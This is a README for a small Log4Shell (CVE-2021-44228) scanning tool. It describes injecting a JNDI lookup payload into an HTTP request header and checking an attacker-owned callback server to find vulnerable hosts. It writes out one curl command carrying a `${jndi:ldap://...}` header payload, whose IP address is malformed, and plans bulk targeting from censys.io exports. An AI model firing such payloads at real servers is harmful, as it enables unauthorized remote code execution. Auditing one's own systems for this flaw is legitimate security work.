
# Little Log4Shellper

Simple tool I wrote on a pleasant Sunday afternoon.  

This tool leverages a log4j vulnerability, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). The exploit involves injecting a malicious payload into a GET request header.  

While the original intent was to quickly audit multiple servers, the --payload option could be used to extend that functionality.   

E.g.

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/a}
```
### Usage
![Imgur](https://i.imgur.com/PlMudwa.png)


### Example
Spin up a test target. In this example I use a vulnerable docker image provided by [@breadchris](https://github.com/breadchris)
![Imgur](https://i.imgur.com/Syt6SvE.png)

Spin up or use an attacker owned host.  
In this example I use a free log4shell server hosted by Huntress.
This is but one approach.

![Imgur](https://i.imgur.com/1g9wevT.png)


Run logshellper.py
![Imgur](https://i.imgur.com/WCEPj4U.png)


Check results. If the target show up on the attacker's server, the target is exploitable.
![Imgur](https://i.imgur.com/jZYjjmV.png)

### TODO
parse .csv file (i.e. exported form censys.io) to build targets.

### Thanks
I'd like to thank the teams at Huntress.com, Lunasec.io
and everybody else who shared their research and efforts.

### References
https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java   
https://www.lunasec.io/docs/blog/log4j-zero-day/  
https://github.com/drahosj/log4shell-vulnerable-app
